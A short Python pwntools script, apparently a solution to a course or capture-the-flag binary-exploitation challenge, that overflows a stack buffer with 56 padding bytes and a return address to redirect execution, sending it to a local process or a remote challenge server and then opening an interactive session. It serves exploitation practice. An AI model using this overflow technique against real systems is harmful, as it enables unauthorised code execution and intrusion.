
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    padding = b'A' * 56 + p64(0x4013ec)
    payload = padding 
    
    # write your payload here
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"2")
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

